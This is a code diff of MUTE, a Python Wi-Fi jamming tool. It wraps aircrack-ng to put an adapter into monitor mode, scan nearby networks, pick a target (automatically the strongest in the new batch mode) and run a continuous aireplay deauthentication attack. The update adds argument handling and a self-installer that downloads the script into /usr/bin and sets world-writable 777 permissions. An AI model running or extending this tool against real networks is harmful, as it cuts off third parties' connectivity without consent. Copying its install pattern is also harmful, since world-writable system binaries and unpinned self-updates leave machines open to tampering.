@@ -1,11 +1,17 @@
-#!/usb/bin/python3
+#!/usr/bin/python3
+
+# -*- coding: utf-8 -*-
+
 """
-MUTE 1.3.0
+MUTE 1.4.1
 Developer K4T
 Developer f4llen
 
-Licensed under the GNU General Public License Version 3 (GNU GPL v3)
+Licensed under the GNU General Public License Version 3 (GNU GPL v3),
+    available at: https://www.gnu.org/licenses/gpl-3.0.txt
+
 (C) 2017 K4YT3X
+(C) 2017 f4llen
 
 This program is DESIGNED FOR LINUX SYSTEM.
 Program MUST be ran with ROOT ACCESS.
@@ -20,12 +26,17 @@ YOU'RE EXPECTED TO KNOW WHAT YOU'RE DOING
 Description: MUTE (WxKill) is an Python Application that kills wifi signals
 
 CHANGELOG:
-Version: 1.3.0
+Version: 1.4.1
 Date: 01/10/2017
 
-1. Changed Method Reading Airodump file
-2. Now automatically selects the strongest signal to kill
-3. Changed 5G scan method, now scans 5G only when enabled
+1. Now supports arguments
+2. Added Function Installing Mute into System
+3. Added Batch Mode
+4. Minor Bug fixes
+
+
+TODO:
+1. Continue developing Arguments
 """
 
 from __future__ import print_function
@@ -35,16 +46,11 @@ import csv
 import multiprocessing
 import shutil
 import socket
-
-# TODO
-"""
-1. Fix SSID Display Bugs
-2. Add "Select SSID by ID" Function
-"""
+import argparse
 
 # Console colors
 # Unix Console colors
-W = '\033[0m'  # white (normal)
+W = '\033[0m'  # white (normal / reset)
 R = '\033[31m'  # red
 G = '\033[32m'  # green
 OR = '\033[33m'  # orange
@@ -56,10 +62,40 @@ GR = '\033[37m'  # grey
 H = '\033[8m'  # hidden
 NH = '\033[28m'  # not hidden
 
-AT_IN_MON = False
-DUMP = '/tmp/mute-01.csv'
+AT_IN_MON = False  # True if adapter in monitor mode
+DUMP = '/tmp/mute-01.csv'  # The airodump file location
+DEV_FILE = '/proc/net/dev'  # System dev file, contains all network interfaces' info
 
-# ##############################Function Defining################################
+
+# --------------------------------Function Defining--------------------------------
+
+def check_root():
+    if os.getuid() != 0:
+        print(R + '[!] MUTE MUST be run with root access' + W)
+        exit(1)
+
+
+def check_platform():
+    if not os.uname()[0].startswith('Linux'):
+        print(R + '[!] MUTE can only be run in linux platform')
+        exit(1)
+
+
+def process_arguments():
+    """
+    This funtion takes care of all arguments
+    """
+    global args
+    parser = argparse.ArgumentParser()
+    options_group = parser.add_argument_group('OPTIONS')
+    options_group.add_argument("-s", "--install", help="-s, --install: Install mute into system", action="store_true")
+
+    action_group = parser.add_argument_group('ACTIONS')
+    action_group.add_argument("-i", "--interface", help="-i [interface], --interface [interface]: Choose Interface", action="store_true")
+    action_group.add_argument("-A", "--automatic", help="-A, --automatic: Automatically mutes strongest signal", action="store_true")
+    action_group.add_argument("-B", "--batch", help="-B, --batch: automatically selects the default option", action="store_true")
+
+    args = parser.parse_args()
 
 
 def internet_connected():
@@ -68,8 +104,8 @@ def internet_connected():
     Returns a Boolean value
     """
     try:
-        print(Y + 'Detecting Internet Connectivity...')
-        socket.create_connection(('172.217.3.3', 443), 10)
+        print(Y + '[+] INFO: Detecting Internet Connectivity...')
+        socket.create_connection(('172.217.3.3', 443), 10)  # Test connection by connecting to google
         return True
     except socket.error:
         return False
@@ -84,7 +120,7 @@ def check_aircrack():
     if os.path.isfile('/usr/bin/aircrack-ng'):
         return True
     else:
-        print(R + '[CRITICAL] Aircrack-NG Suite is not installed!' + W)
+        print(P + '[!] CRITICAL:  Aircrack-NG Suite is not installed!' + W)
         insair = input(Y + '[OPERATION] Do you want MUTE to install it for you? [Y/n]: ' + G)
         print(W, end='', flush=True)
         if insair == '':
@@ -94,54 +130,86 @@ def check_aircrack():
             install_aircrack()
             return False
         elif insair[0].upper() == 'N':
-            print(R + '[CRITICAL] MUTE relies on Aircrack-NG suite to run' + W)
-            print(R + '[CRITICAL] However, Aircrack-NG Suite is not found' + W)
+            print(P + '[!] CRITICAL:  MUTE relies on Aircrack-NG suite to run' + W)
+            print(P + '[!] CRITICAL:  However, Aircrack-NG Suite is not found' + W)
             if AT_IN_MON:
-                print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
+                print(OR + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
                 disable_monitor(monface)
                 print(W, end='', flush=True)
-                print(Y + '\nExiting MUTE Program\n' + W)
+                print(Y + '\n[+] INFO: Exiting MUTE Program\n' + W)
                 exit(0)
             else:
-                print(Y + '\n\nExiting MUTE Program\n' + W)
+                print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
                 exit(0)
 
 
 def install_aircrack():
+    """
+    Update apt cache and install aircrack-ng suite from
+    default source
+
+    TODO:
+        Add the feature adding kali source to sources.list if
+            unable to find aircrack-ng in exist sources
+    """
     if internet_connected():
         os.system('apt update && apt install aircrack-ng')
         return True
     else:
-        print(R + '[ERROR] Internet not Connected!' + W)
-        print(R + '[CRITICAL] Unable to install Aircrack-NG Suite!' + W)
-        print(Y + '[WARNING] Please Check your Internet Connection and Launch the Program Again' + W)
-        print(Y + '[WARNING] Or Manually Install Aircrack-NG Suite' + W)
-        print(R + '[CRITICAL] MUTE relies on Aircrack-NG suite to run' + W)
-        print(R + '[CRITICAL] However, Aircrack-NG Suite is not found' + W)
+        print(R + '[!] ERROR:  Internet not Connected!' + W)
+        print(P + '[!] CRITICAL:  Unable to install Aircrack-NG Suite!' + W)
+        print(Y + '[#] WARNING: Please Check your Internet Connection and Launch the Program Again' + W)
+        print(Y + '[#] WARNING: Or Manually Install Aircrack-NG Suite' + W)
+        print(P + '[!] CRITICAL:  MUTE relies on Aircrack-NG suite to run' + W)
+        print(P + '[!] CRITICAL:  However, Aircrack-NG Suite is not found' + W)
         if AT_IN_MON:
-            print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
+            print(OR + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
             disable_monitor(monface)
             print(W, end='', flush=True)
-            print(Y + '\nExiting MUTE Program\n' + W)
+            print(Y + '\n[+] INFO: Exiting MUTE Program\n' + W)
             exit(0)
         else:
-            print(Y + '\n\nExiting MUTE Program\n' + W)
+            print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
             exit(0)
 
 
 def sysupdate():
     """
-    Update the software by cloning the newest version from GitHub
+    Update the software by downloading the newest code from GitHub
+    This will replace the current file
     """
     if internet_connected():
-        os.system('cd /usr/share/paxe && git clone https://github.com/K4YT3X/MUTE.git')
+        os.system('wget https://raw.githubusercontent.com/K4YT3X/MUTE/master/mute.py -O ' + os.path.abspath(__file__))
         return 0
     else:
-        print(R + '[ERROR] Not connected to internet!' + W)
+        print(R + '[!] ERROR:  Not connected to internet!' + W)
+        return 1
+
+
+def install_mute():
+    """
+    Installs the software by downloading the newest code from GitHub
+    This will download mute.py as mute into /usr/bin
+    Which can be run without a suffix and acts like a command / bindary file
+    """
+    print(G + '[+] INFO Installing MUTE into System...')
+    if internet_connected():
+        print(G + '[+] INFO: Internet Conencted, Installing the newest version of MUTE into the syetem' + W)
+        os.system('wget https://raw.githubusercontent.com/K4YT3X/MUTE/master/mute.py -O /usr/bin/mute')
+        os.system('chmod 777 /usr/bin/mute')
+        return 0
+    else:
+        print(Y + '[#] WARNING: Not connected to internet!' + W)
+        print(Y + '[#] WARNING: Using Offline installation (Might be outdated)')
+        os.system('cp ' + os.path.abspath(__file__) + ' /usr/bin/mute')
+        os.system('chmod 777 /usr/bin/mute')
         return 1
 
 
 def is_empty_string(ent):
+    """
+    Checks if a string is only space
+    """
     ent = str(ent)
     for elmt in ent:
         if elmt != ' ':
@@ -149,8 +217,11 @@ def is_empty_string(ent):
     return True
 
 
-# Determine number of lines in a file
 def file_len(fname):
+    """
+    Determine and returns the file
+    length considering number of rows
+    """
     i = 1
     with open(fname) as f:
         for i, l in enumerate(f):
@@ -159,21 +230,25 @@ def file_len(fname):
 
 
 def enable_monitor(ifx):
+    """
+    Enables wireless adapter monitor mode
+    """
     global AT_IN_MON
     os.system('airmon-ng start ' + ifx)
     if AT_IN_MON is False:
         AT_IN_MON = True
 
 
-# disable monitor on adapter
 def disable_monitor(ifx):
+    """
+    Disables wireless adapter monitor mode
+    """
     global AT_IN_MON
     os.system('airmon-ng stop ' + ifx)
     if AT_IN_MON is True:
         AT_IN_MON = False
 
 
-# Get name of wireless adapter interfaces
 def get_interfaces():
     """
     This Function will display all wireless adapter names by reading linux network file
@@ -182,16 +257,16 @@ def get_interfaces():
     print(OR, end='', flush=True)
     o = 0
     ifid = 1
-    numline = file_len('/proc/net/dev')
+    numline = file_len(DEV_FILE)
     while o <= numline:
-        ilist = linecache.getline('/proc/net/dev', o)
+        ilist = linecache.getline(DEV_FILE, o)
         if 'wlan' not in ilist:
             pass
         else:
-            if linecache.getline('/proc/net/dev', o)[0] == ' ':
-                iface = list(linecache.getline('/proc/net/dev', o)[1:])
+            if linecache.getline(DEV_FILE, o)[0] == ' ':
+                iface = list(linecache.getline(DEV_FILE, o)[1:])
             else:
-                iface = list(linecache.getline('/proc/net/dev', o))
+                iface = list(linecache.getline(DEV_FILE, o))
             print(str(ifid) + '. ', end='', flush=True)
             ifid += 1
             for x in iface:
@@ -213,16 +288,16 @@ def get_ifname(xfid):
     o = 0
     xfsd = 1
     xf = []
-    numline = file_len('/proc/net/dev')
+    numline = file_len(DEV_FILE)
     while o <= numline:
-        ilist = linecache.getline('/proc/net/dev', o)
+        ilist = linecache.getline(DEV_FILE, o)
         if 'wlan' not in ilist:
             pass
         elif xfsd == xfid:
-            if linecache.getline('/proc/net/dev', o)[0] == ' ':
-                iface = list(linecache.getline('/proc/net/dev', o)[1:])
+            if linecache.getline(DEV_FILE, o)[0] == ' ':
+                iface = list(linecache.getline(DEV_FILE, o)[1:])
             else:
-                iface = list(linecache.getline('/proc/net/dev', o))
+                iface = list(linecache.getline(DEV_FILE, o))
             for x in iface:
                 if x != ':':
                     xf.append(x)
@@ -243,18 +318,18 @@ def get_monface(xfid, name):
     o = 0
     xfsd = 1
     xf = []
-    numline = file_len('/proc/net/dev')
+    numline = file_len(DEV_FILE)
     while str(name) != '0':
         if str(name) != '0':
             while o <= numline:
-                ilist = linecache.getline('/proc/net/dev', o)
+                ilist = linecache.getline(DEV_FILE, o)
                 if str(name) not in ilist:
                     pass
                 else:
-                    if linecache.getline('/proc/net/dev', o)[0] == ' ':
-                        iface = list(linecache.getline('/proc/net/dev', o)[1:])
+                    if linecache.getline(DEV_FILE, o)[0] == ' ':
+                        iface = list(linecache.getline(DEV_FILE, o)[1:])
                     else:
-                        iface = list(linecache.getline('/proc/net/dev', o))
+                        iface = list(linecache.getline(DEV_FILE, o))
                     for x in iface:
                         if x != ':':
                             xf.append(x)
@@ -264,14 +339,14 @@ def get_monface(xfid, name):
                 o += 1
         return 'NULL'
     while o <= numline:
-        ilist = linecache.getline('/proc/net/dev', o)
+        ilist = linecache.getline(DEV_FILE, o)
         if 'wlan' not in ilist:
             pass
         elif xfsd == xfid:
-            if linecache.getline('/proc/net/dev', o)[0] == ' ':
-                iface = list(linecache.getline('/proc/net/dev', o)[1:])
+            if linecache.getline(DEV_FILE, o)[0] == ' ':
+                iface = list(linecache.getline(DEV_FILE, o)[1:])
             else:
-                iface = list(linecache.getline('/proc/net/dev', o))
+                iface = list(linecache.getline(DEV_FILE, o))
             for x in iface:
                 if x != ':':
                     xf.append(x)
@@ -290,7 +365,7 @@ def get_macaddr(ssid):
     with open(DUMP, 'r') as airodump:
         for row in reversed(list(csv.reader(airodump, delimiter=';'))):
             if "['Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs']" == str(row):
-                st = True
+                st = True  # The condition above is used to split client section and AP section
             if len(row) > 0 and len(row[0].split(',')[0]) == 17 and st is True:
                 try:
                     if ((row[0].split(','))[13].strip(' ')).upper() == ssid.upper():
@@ -302,6 +377,15 @@ def get_macaddr(ssid):
 
 # Give a list of all scanned SSID
 def list_ssid():
+    """
+    Lists all scanned ssids
+
+    Action:
+        Prints All Scanned ssids
+
+    Returns:
+        [List]: A list of all scanned ssids
+    """
     ssids = []
     with open(DUMP, 'r') as dump_file:
         mac = csv.reader(dump_file, delimiter=';')
@@ -321,10 +405,19 @@ def list_ssid():
         for ssid in ssids:
             print(str(ssids.index(ssid) + 1) + '. ' + ssid)
         return ssids
-    return 'NULL'
 
 
 def get_channel(ssid):
+    """
+
+    Gets the channel an ssid is on
+
+    Arguments:
+        ssid: the ssid name looking up
+
+    Returns:
+        [string] -- the channel of ssid
+    """
     st = False
     with open(DUMP, 'r') as airodump:
         for row in reversed(list(csv.reader(airodump, delimiter=';'))):
@@ -341,6 +434,13 @@ def get_channel(ssid):
 
 # Scan wifi using airodump-ng and output it into a file
 def scan_wlan():
+    """
+    Executes the system command and scans wifi signals
+
+    Argument for --band:
+        a: 5G
+        bg: 2.4G
+    """
     if os.path.exists(DUMP):
         os.system('rm /tmp/mute-01.csv')
     if str(fg) == '1':
@@ -350,6 +450,9 @@ def scan_wlan():
 
 
 def airodump_ng():
+    """
+    Starts a sub-process to scan surrounding Wi-Fi Networks
+    """
     scan_wlan_proc = multiprocessing.Process(target=scan_wlan)
     scan_wlan_proc.start()
     while True:
@@ -358,12 +461,16 @@ def airodump_ng():
             pass
         except KeyboardInterrupt:
             os.system('clear')
-            print(OR + "Finishing airodump..." + W)
+            print(OR + "[+] INFO: Finishing airodump..." + W)
             scan_wlan_proc.terminate()
             break
 
 
 def attack():
+    """
+    This function executes a system command
+    and launches the aireplay attack towards AP
+    """
     os.system('clear')
     print('\n' + R + '####################STARTING ATTACK!####################' + W)
     os.system('iwconfig ' + monface + ' channel ' + get_channel(ssid))
@@ -371,6 +478,10 @@ def attack():
 
 
 def aireplay():
+    """
+    Controls the attacks function
+    Starts attack function in a sub-process
+    """
     start_attack_proc = multiprocessing.Process(target=attack)
     start_attack_proc.start()
     while True:
@@ -379,32 +490,34 @@ def aireplay():
             pass
         except KeyboardInterrupt:
             os.system('clear')
-            print(G + "Stopping Attack..." + W)
+            print(G + "[+] INFO: Stopping Attack..." + W)
             start_attack_proc.terminate()
             break
 
 
-# ##################################ICON####################################
+# --------------------------------ICON--------------------------------
 
 
 def print_icon():
     """
-    Prints the MUTE Iconl
+    Prints the MUTE Icon according to the width & height
     """
     os.system('clear')
     width, height = shutil.get_terminal_size((80, 20))
-    space = (width - 19) // 2 * ' '
-    middle = (height - 18) // 2
+    space = (width - 39) // 2 * ' '
+    middle = (height - 20) // 2
     for _ in range(middle):
         print('')  # Which is a '\n'
-    print(space + W + "#" + R + "####         ####" + W + "#")
-    print(space + R + "  ##           ##")
-    print(space + R + "    ##       ##")
-    print(space + GR + "     #########")
-    print(space + GR + "     #########")
-    print(space + R + "    ## " + R + "     ##")
-    print(space + R + "  ##   " + R + "       ##")
-    print(space + W + "#" + R + "####         ####" + W + "#\n")
+    print(space + W + '    ####' + R + '#####' + W + '##         ##' + R + '#####' + W + '####')
+    print(space + R + '         ####             ####')
+    print(space + R + '           ###           ###')
+    print(space + R + '              ##       ##')
+    print(space + R + '               #########')
+    print(space + R + '               #########')
+    print(space + R + '              ##       ##')
+    print(space + R + '           ###           ###')
+    print(space + R + '         ######         ######')
+    print(space + W + '########' + R + '#####' + W + '#           #' + R + '#####' + W + '########\n\n')
     print('')
     space = (width - 37) // 2 * ' '
     print(space + R + '##     ##  ' + W + '##     ## ######## ######## ')
@@ -418,7 +531,12 @@ def print_icon():
 
 def main():
     """
-    Main Function of Mute
+    The Main Function that controls the flow
+
+    Calls each function such as scan wifi and ask for
+        user input
+    This is in a while loop for restart since puthon
+        doesn't have a goto command
     """
     global monface
     global interface
@@ -428,17 +546,17 @@ def main():
     print_icon()
 
     # Choose Interface
-    print(B + 'Here are Your Interfaces:' + W)
+    print(B + '[+] INFO: Here are Your Interfaces:' + W)
     get_interfaces()
     cont = 0
     iface = ''
     print('')
     while cont != 1:
         try:
-            iface = int(input('Choose Interface (Enter Number): ' + G))
+            iface = int(input('[?] USER: Choose Interface (Enter Number): ' + G))
             print(W, end='', flush=True)
         except ValueError:
-            print(R + 'Invalid Input!' + W)
+            print(R + '[!] ERROR: Invalid Input!' + W)
             pass
         else:
             cont = 1
@@ -447,15 +565,15 @@ def main():
 
     # Enable Monitor Mode
     while True:
-        enmon = input('Enable Monitor Mode on Interface? [Y/n]: ' + G)
+        enmon = input('[?] USER: Enable Monitor Mode on Interface? [Y/n]: ' + G)
         print(W, end='', flush=True)
-        if enmon == '' or enmon[0].upper() == 'Y':
+        if args.batch or enmon == '' or enmon[0].upper() == 'Y':
             print(G, end='', flush=True)
             enable_monitor(interface)
             print(W, end='', flush=True)
             if get_monface(1, 0) == 'NULL':
-                print(R + 'ERROR! Unable to Enable Monitor Mode!' + W)
-                input('Press Any Key to Exit...')
+                print(R + '[!] ERROR: Unable to Enable Monitor Mode!' + W)
+                input('[?] USER: Press Any Key to Exit...')
                 exit(0)
             else:
                 if AT_IN_MON is False:
@@ -463,22 +581,22 @@ def main():
                 break
         elif enmon[0].upper() == 'N':
             if get_monface(1, 0) == 'NULL' or 'mon' not in interface:
-                print(R + 'Selected Adapter Not in Monitor Mode!' + W)
-                enmon = ('Enable Monitor Mode? [Y/N]: ' + G)
-                if enmon[0].upper == 'Y':
+                print(Y + '[#] WARNING: Selected Adapter Not in Monitor Mode!' + W)
+                enmon = ('[?] USER: Enable Monitor Mode? [Y/N]: ' + G)
+                if args.batch or enmon[0].upper == 'Y':
                     print(G, end='', flush=True)
                     enable_monitor(interface)
                     print(W, end='', flush=True)
                     if get_monface(1, 0) == 'NULL':
-                        print(R + 'ERROR! Unable to Enable Monitor Mode!' + W)
+                        print(R + '[!] ERROR: Unable to Enable Monitor Mode!' + W)
                         input('Press Any Key to Exit...')
-                        exit(0)
+                        exit(1)
                     else:
                         break
                 elif enmon[0].upper() == 'N':
-                    print(R + 'Adapter Unusable...Exiting...')
-                    input('Press Any Key to Exit...')
-                    exit()
+                    print(R + '[!] ERROR: Adapter Unusable...Exiting...' + W)
+                    input(G + '[?] USER: Press Any Key to Exit...' + W)
+                    exit(1)
             else:
                 break
         else:
@@ -492,14 +610,11 @@ def main():
     while True:
         fg = input('Scan 5G Networks? [y/N]: ' + G)
         print(W, end='', flush=True)
-        if fg == '':
+        if args.batch or fg == '' or fg[0].upper() == 'N':
             fg = 0
             break
         elif fg[0].upper() == 'Y':
             fg = 1
-            break
-        elif fg[0].upper() == 'N':
-            fg = 0
             break
         else:
             print(R + 'Invalid Input!' + W)
@@ -514,7 +629,11 @@ def main():
     ssids = list_ssid()
 
     while True:
-        wid = input('Enter the ID of Wi-Fi You want to attack: ' + G)
+        if args.batch:
+            print(G + '[BATCH] Automatically Selecting the Strongest Signal')
+            wid = 1
+        else:
+            wid = input('Enter the ID of Wi-Fi You want to attack: ' + G)
         print(W, end='', flush=True)
         try:
             wid = int(wid)
@@ -522,61 +641,70 @@ def main():
             if len(str(get_macaddr(ssid))) == 17:
                 break
             else:
-                print(R + '[ERROR] SSID Not Found!' + W)
+                print(R + '[!] ERROR:  SSID Not Found!' + W)
         except ValueError:
-            print(R + '[ERROR] Invalid Input!' + W)
-            print(R + '[ERROR] Please enter the number!' + W)
+            print(R + '[!] ERROR:  Invalid Input!' + W)
+            print(R + '[!] ERROR:  Please enter the number!' + W)
 
     aireplay()
 
 
-# ##############################Program Entry################################
+# --------------------------------Program Entry--------------------------------
+
+# Check Requirements
+check_root()
+check_platform()
+check_aircrack()
+
+process_arguments()  # Handle All Argument Inputs
+
+if args.install:
+    install_mute()
 
 while True:
     try:
-        check_aircrack()
-        main()
+        main()  # Call Main function to start program
         if AT_IN_MON:
-            print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
+            print(G + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
             disable_monitor(monface)
             print(W, end='', flush=True)
-            print(Y + '\nExiting MUTE Program\n' + W)
+            print(Y + '\n[+] INFO:Exiting MUTE Program\n' + W)
         else:
-            print(Y + '\n\nExiting MUTE Program\n' + W)
+            print(Y + '\n\n[+] INFO:Exiting MUTE Program\n' + W)
         exit(0)
     except KeyboardInterrupt:
         if AT_IN_MON:
-            print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
+            print(OR + '\n\n[+] INFO:Adapter Exiting Monitor Mode...' + W)
             disable_monitor(monface)
             print(W, end='', flush=True)
-            print(Y + '\nExiting MUTE Program\n' + W)
+            print(Y + '\n[+] INFO:Exiting MUTE Program\n' + W)
         else:
-            print(Y + '\n\nExiting MUTE Program\n' + W)
+            print(Y + '\n\n[+] INFO:Exiting MUTE Program\n' + W)
         exit(0)
     except Exception as er:
-        print(R + '[CRITICAL] Error Detected!' + W)
+        print(P + '[!] CRITICAL:  Error Detected!' + W)
         print(R + str(er))
         while True:
-            restart = input('Restart Program? [Y/n]: ' + G)
+            restart = input('[?] USER: Restart Program? [Y/n]: ' + G)
             print(W, end='', flush=True)
             if restart == '':
-                print(Y + 'Restarting MUTE Program' + W)
+                print(Y + '[+] INFO: Restarting MUTE Program' + W)
                 break
             elif restart[0].upper() == 'Y':
-                print(Y + 'Restarting MUTE Program' + W)
+                print(Y + '[+] INFO: Restarting MUTE Program' + W)
                 break
             elif restart[0].upper() == 'N':
-                print(R + 'Exiting Program due to Errors...' + W)
+                print(R + '[+] INFO: Exiting Program due to Errors...' + W)
                 if AT_IN_MON:
-                    print(OR + '\n\nAdapter Exiting Monitor Mode...' + W)
+                    print(OR + '\n\n[+] INFO: Adapter Exiting Monitor Mode...' + W)
                     disable_monitor(monface)
                     print(W, end='', flush=True)
-                    print(Y + '\nExiting MUTE Program\n' + W)
+                    print(OR + '\n[+] INFO: Exiting MUTE Program\n' + W)
                     exit(0)
                 else:
-                    print(Y + '\n\nExiting MUTE Program\n' + W)
+                    print(Y + '\n\n[+] INFO: Exiting MUTE Program\n' + W)
                     exit(0)
             else:
-                print(R + 'Invalid Input!' + W)
+                print(R + '[!] ERROR: Invalid Input!' + W)
                 pass
         continue
